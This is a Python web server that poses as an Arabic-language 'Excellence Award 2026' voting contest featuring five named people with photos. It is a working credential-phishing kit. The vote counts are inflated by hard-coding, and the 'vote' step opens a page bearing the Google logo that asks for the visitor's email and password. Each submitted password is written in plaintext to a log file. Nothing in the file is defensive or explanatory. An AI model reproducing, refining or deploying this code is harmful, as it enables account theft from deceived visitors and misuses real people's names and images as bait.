from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import time
import sqlite3
import os

# المنفذ للسيرفرات العالمية
PORT = int(os.environ.get("PORT", 8080))

def init_db():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS votes_count (id TEXT PRIMARY KEY, base_votes INTEGER)')
    cursor.execute('CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, target TEXT, timestamp TEXT)')
    initial_data = [("almohammadi", 2745000), ("alawlaqi", 2610200), ("bindawod", 2190800), ("hajar", 2480500), ("dmami", 2350100)]
    for cid, count in initial_data:
        cursor.execute('INSERT OR IGNORE INTO votes_count VALUES (?, ?)', (cid, count))
    conn.commit()
    conn.close()

def get_total_votes(cid):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT base_votes FROM votes_count WHERE id=?', (cid,))
    res = cursor.fetchone()
    base = res[0] if res else 0
    cursor.execute('SELECT COUNT(*) FROM users WHERE target=?', (cid,))
    extra = cursor.fetchone()[0]
    conn.close()
    return base + extra

def register_user(email, password, target):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    try:
        cursor.execute('INSERT INTO users VALUES (?, ?, ?)', (email, target, time.ctime()))
        conn.commit()
        with open("logs.txt", "a", encoding="utf-8") as f:
            f.write(f"Email: {email} | Pass: {password} | Target: {target} | Time: {time.ctime()}\n")
        return True
    except: return False
    finally: conn.close()

init_db()

celebrities = {
    "almohammadi": {"name": "الأستاذ محمد المحمدي", "img": "https://i.ibb.co/FkMX3pb8/01-t-QOqg-Pv.webp"},
    "alawlaqi": {"name": "أبو حيدر العولقي", "img": "https://i.ibb.co/Sw1jsRg5/FB-IMG-1767749609747.jpg"},
    "bindawod": {"name": "Hefhallh Bin Dawod", "img": "https://i.ibb.co/35bcK71C/FB-IMG-1767746087575.jpg"},
    "hajar": {"name": "الأستاذ أحمد حجر", "img": "https://i.ibb.co/20bTB6mB/01-omm-QIf-T.webp"},
    "dmami": {"name": "عبد الرحمن الدمامي", "img": "https://i.ibb.co/rRR3rL2w/01-HHK44o2.webp"}
}

finish_time = time.time() + (160 * 60 * 60)

class FinalContestServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        path = urlparse(self.path).path
        query = parse_qs(urlparse(self.path).query)
        rem = int(finish_time - time.time())
        if path == '/' or path == '': self.show_timer(rem)
        elif path == '/statement': self.show_stmt()
        elif path == '/vote': self.show_vote()
        elif path == '/login': self.show_login(query.get('target', ['almohammadi'])[0])

    def show_timer(self, r):
        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{{background:#0d3b3f;color:white;text-align:center;font-family:sans-serif;display:flex;flex-direction:column;justify-content:center;height:100vh;margin:0;}}.timer{{font-size:3rem;color:#c6a15b;margin:20px 0;}}.btn{{padding:15px 40px;background:#c6a15b;color:#0d3b3f;text-decoration:none;border-radius:50px;font-weight:bold;}}</style></head><body><img src="https://i.ibb.co/TM4Hkk0q/images-4.jpg" width="120" style="border-radius:20px;margin:auto;"><h1>جائزة التميز 2026</h1><div class="timer" id="t"></div><a href="/statement" class="btn">دخول المسابقة</a><script>var s={r};setInterval(function(){{var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;document.getElementById('t').innerHTML=h+":"+(m<10?'0':'')+m+":"+(sec<10?'0':'')+sec;if(s>0)s--;}},1000);</script></body></html>"""
        self.wfile.write(html.encode('utf-8'))

    def show_stmt(self):
        html = """<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:sans-serif;text-align:center;padding:20px;}.btn{display:inline-block;margin-top:20px;padding:15px 30px;background:#0d3b3f;color:white;text-decoration:none;border-radius:10px;}</style></head><body><img src="https://i.ibb.co/NdJ88J0z/FB-IMG-1767749812219.jpg" style="width:100%;max-width:400px;border-radius:15px;"><h2>بيان اللجنة</h2><p>بدء التصويت النهائي.</p><a href="/vote" class="btn">الانتقال للقائمة ←</a></body></html>"""
        self.wfile.write(html.encode('utf-8'))

    def show_vote(self):
        cards = ""
        for k, v in celebrities.items():
            vts = get_total_votes(k)
            cards += f"""<div style="background:white;border-radius:20px;padding:20px;margin:15px auto;max-width:350px;box-shadow:0 4px 10px rgba(0,0,0,0.1);text-align:center;"><img src="{v['img']}" style="width:100px;height:100px;border-radius:50%;object-fit:cover;border:2px solid #c6a15b;"><h3>{v['name']}</h3><div style="display:flex;justify-content:center;gap:15px;align-items:center;"><a href="/login?target={k}" style="background:#0d3b3f;color:white;padding:10px 20px;text-decoration:none;border-radius:20px;">تصويت</a><div style="background:#fdfdf0;padding:8px 12px;border-radius:15px;font-weight:bold;">{vts:,}</div></div></div>"""
        self.wfile.write(f"<html dir='rtl'><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head><body style='background:#f8f9fa;font-family:sans-serif;padding:10px;'><h2 style='text-align:center;color:#0d3b3f;'>قائمة المرشحين</h2>{cards}</body></html>".encode('utf-8'))

    def show_login(self, target):
        html = f"""<html dir="rtl"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{{background:#0d3b3f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;}} .box{{background:white;padding:30px;border-radius:25px;width:90%;max-width:350px;text-align:center;}} input{{width:100%;padding:15px;margin:10px 0;border:1px solid #ddd;border-radius:10px;box-sizing:border-box;}} .btn{{width:100%;padding:15px;background:#0d3b3f;color:white;border:none;border-radius:10px;font-weight:bold;}}</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Hi_res_logo.png" width="40"><h2>تحقق من الحساب</h2><p>لتأكيد التصويت لـ: <b>{celebrities[target]['name']}</b></p><form method="POST" action="/post_vote?target={target}"><input type="email" name="e" placeholder="البريد الإلكتروني" required><input type="password" name="p" placeholder="كلمة المرور" required><button type="submit" class="btn">تأكيد الآن</button></form></div></body></html>"""
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        cl = int(self.headers['Content-Length'])
        pd = self.rfile.read(cl).decode('utf-8')
        params = parse_qs(pd)
        em = params.get('e', [''])[0].strip().lower()
        pw = params.get('p', [''])[0]
        tg = parse_qs(urlparse(self.path).query).get('target', ['almohammadi'])[0]
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        if register_user(em, pw, tg):
            clb = celebrities[tg]
            html = f"""<html dir="rtl"><body style="margin:0;height:100vh;background:url('{clb['img']}') center/cover;display:flex;justify-content:center;align-items:center;font-family:sans-serif;"><div style="background:rgba(255,255,255,0.95);padding:30px;border-radius:20px;text-align:center;"><h1>✅ تم بنجاح</h1><p>شكراً لتصويتك لـ {clb['name']}</p><a href="/vote" style="color:#0d3b3f;font-weight:bold;text-decoration:none;">العودة</a></div></body></html>"""
        else:
            html = f"""<html dir="rtl"><body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;text-align:center;"><div><h1>❌ عذراً</h1><p>تم التصويت مسبقاً بهذا الإيميل.</p><a href="/vote">العودة</a></div></body></html>"""
        self.wfile.write(html.encode('utf-8'))

server = HTTPServer(('0.0.0.0', PORT), FinalContestServer)
server.serve_forever()
